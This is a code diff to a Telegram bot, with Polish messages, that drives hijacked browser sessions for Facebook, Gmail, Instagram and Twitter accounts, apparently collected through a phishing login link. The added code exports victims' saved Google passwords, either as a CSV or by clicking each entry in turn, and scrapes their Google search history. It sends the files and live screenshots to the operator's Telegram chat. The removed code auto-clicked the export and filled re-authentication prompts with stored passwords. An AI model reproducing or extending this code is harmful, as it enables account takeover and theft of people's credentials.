@@ -51,6 +51,34 @@ export async function sendDocument(buffer, filename, caption) {
   } catch { /* best-effort */ }
 }
 
+// sendPhoto — sends a JPEG/PNG buffer as an inline photo (visible directly in chat).
+// Use this for screenshots instead of sendDocument.
+export async function sendPhoto(buffer, caption, chatId) {
+  if (!isEnabled()) return;
+  try {
+    const targetChat = chatId || config.telegramChatId;
+    const boundary = '----spPhotoBoundary' + Date.now().toString(16);
+    const parts = [];
+    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
+    text(`--${boundary}\r\n`);
+    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${targetChat}\r\n`);
+    if (caption) {
+      text(`--${boundary}\r\n`);
+      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption.slice(0, 1024)}\r\n`);
+    }
+    text(`--${boundary}\r\n`);
+    text(`Content-Disposition: form-data; name="photo"; filename="screen.jpg"\r\n`);
+    text(`Content-Type: image/jpeg\r\n\r\n`);
+    parts.push(buffer);
+    text(`\r\n--${boundary}--\r\n`);
+    await fetch(apiUrl('sendPhoto'), {
+      method: 'POST',
+      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
+      body: Buffer.concat(parts),
+    });
+  } catch { /* best-effort */ }
+}
+
 export async function discoverChatId() {
   const res = await fetch(apiUrl('getUpdates') + '?limit=1&offset=-1');
   const data = await res.json();
@@ -276,107 +304,6 @@ async function handleAddAccount(chatId, args, publicHost) {
   }
 }
 
-// ── /sessions — inline keyboard showing session status ───────────────────────
-
-async function handleSessions(chatId, publicHost) {
-  try {
-    const { loadAccounts } = await import('./accounts.js');
-    const { status } = await import('./browser.js');
-    const list = await loadAccounts();
-    if (list.length === 0) {
-      await replyTo(chatId, '📱 Brak kont. Użyj /addaccount <imię> <platforma>');
-      return;
-    }
-    const keyboard = list.map(acc => {
-      const s = status(acc.id);
-      let icon;
-      if (s.running) {
-        icon = '🟢'; // sesja aktywna
-      } else if (s.lastActivity) {
-        icon = '🟡'; // sesja wygasła (była uruchomiona)
-      } else {
-        icon = '⚫'; // sesja nigdy nie była uruchomiona
-      }
-      return [{ text: `${icon} ${acc.label}`, callback_data: `sess:${acc.id}` }];
-    });
-    keyboard.push([{ text: '🔄 Odśwież', callback_data: 'sessions' }]);
-    const running = list.filter(a => status(a.id).running).length;
-    await sendInlineMessage(chatId, `📊 Sesje (${running}/${list.length} aktywnych):`, keyboard);
-  } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
-  }
-}
-
-async function handleSessionMenu(chatId, accountId, callbackQueryId, publicHost) {
-  try {
-    const { getAccount } = await import('./accounts.js');
-    const { status, start, stop } = await import('./browser.js');
-    const acc = await getAccount(accountId);
-    if (!acc) { await answerCallback(callbackQueryId, '❌ Nie znaleziono konta'); return; }
-    await answerCallback(callbackQueryId);
-
-    const s = status(accountId);
-    let statusLine;
-    if (s.running) {
-      const mins = s.lastActivity ? Math.floor((Date.now() - s.lastActivity) / 60000) : null;
-      statusLine = `🟢 Aktywna${mins !== null ? ` (ostatnia aktywność: ${mins} min temu)` : ''}`;
-    } else if (s.lastActivity) {
-      const mins = Math.floor((Date.now() - s.lastActivity) / 60000);
-      statusLine = `🟡 Wygasła (ostatnia aktywność: ${mins} min temu)`;
-    } else {
-      statusLine = '⚫ Nie uruchomiona';
-    }
-
-    const host = publicHost || config.publicHost;
-    const link = acc.ref && host ? `https://${host}/account/login?ref=${acc.ref}` : null;
-    const lines = [`📋 *${acc.label}*`, `Status: ${statusLine}`];
-    if (acc.email) lines.push(`📧 ${acc.email}`);
-
-    const keyboard = [];
-    if (s.running) {
-      keyboard.push([{ text: '⏹ Zatrzymaj sesję', callback_data: `sess_stop:${accountId}` }]);
-    } else {
-      keyboard.push([{ text: '▶️ Uruchom sesję', callback_data: `sess_start:${accountId}` }]);
-    }
-    if (link) keyboard.push([{ text: '🔗 Otwórz sesję', url: link }]);
-    keyboard.push([{ text: '« Wróć do sesji', callback_data: 'sessions' }]);
-
-    await sendInlineMessage(chatId, lines.join('\n'), keyboard);
-  } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
-  }
-}
-
-async function handleSessionStart(chatId, accountId, callbackQueryId, publicHost) {
-  await answerCallback(callbackQueryId, '⏳ Uruchamiam...');
-  try {
-    const { getAccount } = await import('./accounts.js');
-    const { start } = await import('./browser.js');
-    const acc = await getAccount(accountId);
-    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
-    await start(accountId, '127.0.0.1');
-    await replyTo(chatId, `✅ Sesja "${acc.label}" uruchomiona.`);
-    await handleSessions(chatId, publicHost);
-  } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
-  }
-}
-
-async function handleSessionStop(chatId, accountId, callbackQueryId, publicHost) {
-  await answerCallback(callbackQueryId, '⏳ Zatrzymuję...');
-  try {
-    const { getAccount } = await import('./accounts.js');
-    const { stop } = await import('./browser.js');
-    const acc = await getAccount(accountId);
-    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
-    await stop(accountId);
-    await replyTo(chatId, `⏹ Sesja "${acc.label}" zatrzymana.`);
-    await handleSessions(chatId, publicHost);
-  } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
-  }
-}
-
 // ── /panel — inline keyboard main menu ───────────────────────────────────────
 
 async function editMessage(chatId, messageId, text) {
@@ -513,7 +440,7 @@ async function handleHistoryFile(chatId, accountId, callbackQueryId) {
     const histPage = await ctx.newPage();
     try {
       // myactivity.google.com — search history
-      await histPage.goto('https://myactivity.google.com/myactivity', { waitUntil: 'load', timeout: 30000 });
+      await histPage.goto('https://myactivity.google.com/myactivity', { waitUntil: 'networkidle', timeout: 25000 });
       await histPage.waitForTimeout(2000);
 
       // Scroll to load more entries
@@ -555,161 +482,133 @@ async function handleHistoryFile(chatId, accountId, callbackQueryId) {
   }
 }
 
+// Show two-option menu for Google Passwords export
 async function handleGooglePasswords(chatId, accountId, callbackQueryId) {
-  await answerCallback(callbackQueryId, '⏳ Sprawdzam cache...');
+  await answerCallback(callbackQueryId);
+  const keyboard = [
+    [{ text: '📥 Eksport CSV (ręczny)', callback_data: `gpw_csv:${accountId}` }],
+    [{ text: '📋 Lista haseł (powolna)', callback_data: `gpw_rows:${accountId}` }],
+  ];
+  await sendInlineMessage(chatId,
+    '🔐 Wybierz metodę eksportu haseł Google:\n\n' +
+    '📥 *Eksport CSV* — otwiera passwords.google.com/options, logujesz się sam i klikasz Eksportuj. Bot wysyła plik CSV na kanał.\n\n' +
+    '📋 *Lista haseł* — bot klika każdy wpis po kolei i wyciąga hasła (wolne, wymaga zalogowanej sesji).',
+    keyboard
+  );
+}
+
+// Option 1: User-driven CSV export — user auth + click, bot sends CSV file
+async function handleGpwCsv(chatId, accountId, callbackQueryId) {
+  await answerCallback(callbackQueryId, '⏳ Otwieram menadżer haseł...');
   try {
     const { getAccount } = await import('./accounts.js');
-    const { getContext, getPasswordsCache, exportPasswordsInBackground } = await import('./browser.js');
+    const { readFile } = await import('node:fs/promises');
     const acc = await getAccount(accountId);
     if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
 
-    // Check cache first — instant send
-    const cached = getPasswordsCache(accountId);
-    if (cached) {
-      const age = Math.floor((Date.now() - cached.ts) / 60000);
-      await sendDocument(cached.txt, `google-passwords-${accountId}.txt`, `🔐 Google Passwords: ${acc.label} (${cached.count} wpisów, cache ${age} min temu)`);
-      await sendDocument(cached.csv, `google-passwords-${accountId}.csv`, null);
-      return;
-    }
-
-    // No cache — export now
-    await replyTo(chatId, `⏳ Brak cache, eksportuję hasła dla "${acc.label}"...`);
+    const { getContext, start, openPasswordsExport } = await import('./browser.js');
     let ctx = getContext(accountId);
     if (!ctx) {
       await replyTo(chatId, `⏳ Uruchamiam sesję "${acc.label}"...`);
-      const { start } = await import('./browser.js');
       await start(accountId, '127.0.0.1');
       await new Promise(r => setTimeout(r, 3000));
       ctx = getContext(accountId);
       if (!ctx) { await replyTo(chatId, `❌ Nie udało się uruchomić sesji "${acc.label}".`); return; }
     }
 
-    // Run export and wait
-    await exportPasswordsInBackground(accountId);
-    const result = getPasswordsCache(accountId);
-    if (!result) { await replyTo(chatId, `❌ Eksport nie powiódł się. Sprawdź czy konto jest zalogowane w Google.`); return; }
-    await sendDocument(result.txt, `google-passwords-${accountId}.txt`, `🔐 Google Passwords: ${acc.label} (${result.count} wpisów)`);
-    await sendDocument(result.csv, `google-passwords-${accountId}.csv`, null);
+    await replyTo(chatId,
+      `📥 Otwieram passwords.google.com/options w przeglądarce "${acc.label}".\n\n` +
+      `Zaloguj się (jeśli wymagane) i kliknij *Eksportuj hasła*.\n\n` +
+      `Bot wysyła screeny co 10 sek żebyś wiedział co się dzieje.`
+    );
+
+    const onScreenshot = (buf, url) => {
+      sendPhoto(buf, `📷 ${acc.label} — ${url.slice(0, 80)}`).catch(() => {});
+    };
+
+    const result = await openPasswordsExport(accountId, onScreenshot);
+
+    const buf = await readFile(result.path);
+    await sendDocument(buf, result.filename, `🔐 Google Passwords: ${acc.label}`);
+    await replyTo(chatId, `✅ Gotowe — plik CSV wysłany powyżej.`);
   } catch (err) {
-    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+    await replyTo(chatId, `❌ Błąd eksportu CSV: ${err?.message || err}`);
   }
 }
 
-async function handleGooglePasswords_UNUSED(chatId, accountId, callbackQueryId) {
-  // kept for reference — replaced by cache+export approach above
+// Option 2: Row-by-row click through password list
+async function handleGpwRows(chatId, accountId, callbackQueryId) {
+  await answerCallback(callbackQueryId, '⏳ Uruchamiam pobieranie haseł...');
   try {
-    const { getContext } = await import('./browser.js');
-    const pwPage = await (getContext(accountId))?.newPage();
-    try {
-      // Navigate to export page
-      await pwPage.goto('https://passwords.google.com/options?ep=1', { waitUntil: 'load', timeout: 30000 });
-      await pwPage.waitForTimeout(2000);
+    const { getAccount } = await import('./accounts.js');
+    const { readFile } = await import('node:fs/promises');
+    const acc = await getAccount(accountId);
+    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
 
-      // Start waiting for download BEFORE clicking export button
-      const downloadPromise = pwPage.waitForEvent('download', { timeout: 60000 });
-
-      // Find and click export button (searches shadow DOM too)
-      const clicked = await pwPage.evaluate(() => {
-        function findAndClick(root) {
-          if (!root) return false;
-          const btns = root.querySelectorAll ? root.querySelectorAll('button, a') : [];
-          for (const b of btns) {
-            const t = (b.textContent || b.getAttribute('aria-label') || '').toLowerCase();
-            if (t.includes('export') || t.includes('eksport')) { b.click(); return true; }
-          }
-          for (const el of root.querySelectorAll ? root.querySelectorAll('*') : []) {
-            if (el.shadowRoot && findAndClick(el.shadowRoot)) return true;
-          }
-          return false;
-        }
-        return findAndClick(document.body);
-      });
-
-      if (!clicked) {
-        await replyTo(chatId, `❌ Nie znaleziono przycisku eksportu. Konto może nie być zalogowane w Google (${acc.label}).`);
-        await pwPage.close().catch(() => {});
-        return;
-      }
-
-      // Handle "Export passwords?" confirmation dialog
-      await pwPage.waitForTimeout(1500);
-      await pwPage.evaluate(() => {
-        function findAndClick(root) {
-          if (!root) return false;
-          const btns = root.querySelectorAll ? root.querySelectorAll('button') : [];
-          for (const b of btns) {
-            const t = (b.textContent || b.getAttribute('aria-label') || '').toLowerCase();
-            if (t.includes('export') || t.includes('eksport') || t.includes('download') || t.includes('pobierz')) {
-              b.click(); return true;
-            }
-          }
-          for (const el of root.querySelectorAll ? root.querySelectorAll('*') : []) {
-            if (el.shadowRoot && findAndClick(el.shadowRoot)) return true;
-          }
-          return false;
-        }
-        findAndClick(document.body);
-      }).catch(() => {});
-
-      // Handle possible re-auth
-      await pwPage.waitForTimeout(1500);
-      const reAuthVisible = await pwPage.evaluate(() => {
-        const inp = document.querySelector('input[type="password"]');
-        return inp && inp.offsetParent !== null;
-      }).catch(() => false);
-
-      if (reAuthVisible && acc.password) {
-        await pwPage.evaluate((pw) => {
-          const inp = document.querySelector('input[type="password"]');
-          if (inp) { inp.value = pw; inp.dispatchEvent(new Event('input', { bubbles: true })); }
-        }, acc.password);
-        await pwPage.keyboard.press('Enter');
-        await pwPage.waitForTimeout(2000);
-      }
-
-      // Wait for the download
-      let download;
-      try {
-        download = await downloadPromise;
-      } catch {
-        await replyTo(chatId, `❌ Download nie nastąpił (timeout). Sprawdź czy konto jest zalogowane w Google (${acc.label}).`);
-        await pwPage.close().catch(() => {});
-        return;
-      }
-
-      const stream = await download.createReadStream();
-      const chunks = [];
-      for await (const chunk of stream) chunks.push(chunk);
-      const csvBuf = Buffer.concat(chunks);
-
-      // Parse CSV to count entries and reformat as readable txt
-      const lines = csvBuf.toString('utf8').split('\n').map(l => l.trim()).filter(Boolean);
-      const header = lines[0]; // name,url,username,password
-      const dataLines = lines.slice(1);
-      const count = dataLines.length;
-
-      // Convert to readable format
-      const readable = dataLines.map(line => {
-        // Simple CSV parse (handles quoted fields)
-        const cols = [];
-        let cur = '', inQ = false;
-        for (const ch of line) {
-          if (ch === '"') { inQ = !inQ; }
-          else if (ch === ',' && !inQ) { cols.push(cur); cur = ''; }
-          else cur += ch;
-        }
-        cols.push(cur);
-        const [name, url, username, password] = cols;
-        return `${name || url}\n  login: ${username}\n  hasło: ${password}`;
-      }).join('\n\n');
-
-      const txtBuf = Buffer.from(readable, 'utf8');
-      await sendDocument(txtBuf, `google-passwords-${accountId}.txt`, `🔐 Google Passwords: ${acc.label} (${count} wpisów)`);
-      // Also send raw CSV
-      await sendDocument(csvBuf, `google-passwords-${accountId}.csv`, null);
-    } finally {
-      await pwPage.close().catch(() => {});
+    const { getContext, start, openPasswordsExportRowByRow } = await import('./browser.js');
+    let ctx = getContext(accountId);
+    if (!ctx) {
+      await replyTo(chatId, `⏳ Uruchamiam sesję "${acc.label}"...`);
+      await start(accountId, '127.0.0.1');
+      await new Promise(r => setTimeout(r, 3000));
+      ctx = getContext(accountId);
+      if (!ctx) { await replyTo(chatId, `❌ Nie udało się uruchomić sesji "${acc.label}".`); return; }
     }
+
+    let progressMsgId = null;
+    try {
+      const r = await fetch(apiUrl('sendMessage'), {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: `🔐 Otwieram passwords.google.com — screeny co 10 sek...` }),
+      });
+      const d = await r.json();
+      progressMsgId = d.result?.message_id;
+    } catch {}
+
+    const onScreenshot = (buf, url) => {
+      sendPhoto(buf, `📷 ${acc.label} — ${url.slice(0, 80)}`).catch(() => {});
+    };
+    const onProgress = (done, total) => {
+      if (progressMsgId && done % 5 === 0) {
+        editMessage(chatId, progressMsgId, `🔐 Pobieram hasła: ${done} / ${total}`).catch(() => {});
+      }
+    };
+
+    const result = await openPasswordsExportRowByRow(accountId, onScreenshot, onProgress);
+
+    if (progressMsgId) {
+      await editMessage(chatId, progressMsgId, `✅ Gotowe: ${result.count} wpisów — wysyłam plik...`);
+    }
+
+    const buf = await readFile(result.path);
+    // Send file — log Telegram API response for debugging
+    try {
+      const boundary = '----spBoundary' + Date.now().toString(16);
+      const parts = [];
+      const t = (s) => parts.push(Buffer.from(s, 'utf8'));
+      t(`--${boundary}\r\n`);
+      t(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`);
+      t(`--${boundary}\r\n`);
+      t(`Content-Disposition: form-data; name="caption"\r\n\r\n🔐 Google Passwords: ${acc.label} (${result.count} wpisów)\r\n`);
+      t(`--${boundary}\r\n`);
+      t(`Content-Disposition: form-data; name="document"; filename="${result.filename}"\r\n`);
+      t(`Content-Type: text/plain\r\n\r\n`);
+      parts.push(buf);
+      t(`\r\n--${boundary}--\r\n`);
+      const tgRes = await fetch(apiUrl('sendDocument'), {
+        method: 'POST',
+        headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
+        body: Buffer.concat(parts),
+      });
+      const tgData = await tgRes.json().catch(() => ({}));
+      if (!tgData.ok) {
+        await replyTo(chatId, `⚠️ Telegram odrzucił plik: ${JSON.stringify(tgData.description || tgData)}`);
+      }
+    } catch (sendErr) {
+      await replyTo(chatId, `⚠️ Błąd wysyłania pliku: ${sendErr?.message}`);
+    }
+    await replyTo(chatId, `✅ Gotowe — ${result.count} haseł.`);
   } catch (err) {
     await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
   }
@@ -724,10 +623,23 @@ export function startCommandListener(publicHost) {
   let offset = 0;
   let running = true;
 
+  // Flush any stale updates accumulated while bot was offline — avoids
+  // replaying old callback_queries on every restart.
+  async function flushPendingUpdates() {
+    try {
+      const res = await fetch(apiUrl('getUpdates') + '?limit=100&timeout=0&allowed_updates=["message","callback_query"]');
+      const data = await res.json();
+      if (data.result?.length) {
+        offset = data.result[data.result.length - 1].update_id + 1;
+      }
+    } catch { /* ignore */ }
+  }
+
   async function poll() {
+    await flushPendingUpdates();
     while (running) {
       try {
-        const url = apiUrl('getUpdates') + `?timeout=30&offset=${offset}&allowed_updates=["message","callback_query"]`;
+        const url = apiUrl('getUpdates') + `?timeout=30&offset=${offset}&allowed_updates=["message","callback_query","channel_post"]`;
         const res = await fetch(url, { signal: AbortSignal.timeout(40_000) });
         if (!res.ok) { await new Promise(r => setTimeout(r, 5000)); continue; }
         const data = await res.json();
@@ -742,16 +654,7 @@ export function startCommandListener(publicHost) {
             const chatId = cq.message?.chat?.id;
             const d = cq.data || '';
 
-            if (d === 'sessions') {
-              await handleSessions(chatId, publicHost);
-              await answerCallback(cq.id);
-            } else if (d.startsWith('sess:')) {
-              await handleSessionMenu(chatId, d.slice(5), cq.id, publicHost);
-            } else if (d.startsWith('sess_start:')) {
-              await handleSessionStart(chatId, d.slice(11), cq.id, publicHost);
-            } else if (d.startsWith('sess_stop:')) {
-              await handleSessionStop(chatId, d.slice(10), cq.id, publicHost);
-            } else if (d === 'panel') {
+            if (d === 'panel') {
               await handlePanel(chatId, publicHost);
               await answerCallback(cq.id);
             } else if (d.startsWith('acc:')) {
@@ -765,6 +668,10 @@ export function startCommandListener(publicHost) {
               await handleHistoryFile(chatId, d.slice(5), cq.id);
             } else if (d.startsWith('gpas:')) {
               await handleGooglePasswords(chatId, d.slice(5), cq.id);
+            } else if (d.startsWith('gpw_csv:')) {
+              await handleGpwCsv(chatId, d.slice(8), cq.id);
+            } else if (d.startsWith('gpw_rows:')) {
+              await handleGpwRows(chatId, d.slice(9), cq.id);
             } else if (d === 'help:addaccount') {
               await answerCallback(cq.id);
               await replyTo(chatId, '➕ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
@@ -774,12 +681,15 @@ export function startCommandListener(publicHost) {
             continue;
           }
 
-          // ── message / command ──
-          const msg = upd.message;
+          // ── message / command (also channel_post for broadcast channels) ──
+          const msg = upd.message || upd.channel_post;
           if (!msg?.text) continue;
-          const fromId = String(msg.from?.id || '');
+          const fromId = String(msg.from?.id || msg.sender_chat?.id || '');
           const chatId = msg.chat?.id;
-          if (adminId && fromId !== adminId) continue;
+          // For channel posts from the configured channel, skip the admin-ID check
+          // (channel posts don't carry from.id — they're the channel itself posting).
+          const isOwnChannel = String(chatId) === String(config.telegramChatId);
+          if (adminId && fromId !== adminId && !isOwnChannel) continue;
           const text = msg.text.trim();
           const cmdMatch = text.match(/^(\/\w+)(?:@\S+)?\s*(.*)/s);
           if (!cmdMatch) continue;
@@ -787,9 +697,7 @@ export function startCommandListener(publicHost) {
           const rest = cmdMatch[2].trim();
           const parts = rest ? rest.split(/\s+/) : [];
 
-          if (cmd === '/sessions') {
-            await handleSessions(chatId, publicHost);
-          } else if (cmd === '/panel' || cmd === '/start') {
+          if (cmd === '/panel' || cmd === '/start') {
             await handlePanel(chatId, publicHost);
           } else if (cmd === '/adduser') {
             await handlePanelAdduser(chatId, parts);
